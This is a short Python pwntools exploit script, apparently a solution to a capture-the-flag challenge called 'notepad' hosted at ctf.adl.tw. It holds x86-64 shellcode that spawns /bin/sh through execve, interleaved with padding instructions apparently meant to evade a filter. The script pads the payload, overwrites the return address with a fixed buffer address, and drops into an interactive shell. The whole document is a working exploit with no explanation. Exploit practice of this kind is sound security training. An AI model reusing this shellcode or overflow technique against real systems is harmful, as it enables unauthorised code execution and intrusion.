from pwn import *
import struct

local = False
elf = 'notepad' 

if local: 
    print('./'+elf)
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "ctf.adl.tw"
    port = 11003
    r = remote(ip,port)

context.arch = 'amd64'
context.os= 'linux'
#addr =
payload = b'\x48\x31\xc0\x50\x90\x90\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\xC7\xC3\x2F\x2F\x73\x68\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\xC1\xE3\x20\x90\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\x81\xC3\x2F\x62\x69\x6E\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x53\x48\x89\xE7\x50\x57\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x49\xbb\x61\x61\x61\x61\x61\x61\x61\x61\x0F\x05'
print(payload)
print(len(payload))
payload += b'\00'*51
print(len(payload))
print(r.recv())
#address = r.recvline()
#address = address[:-1]
payload += p64(int("0x6010c0", 16))
print(payload)
r.sendline(payload)
r.interactive()
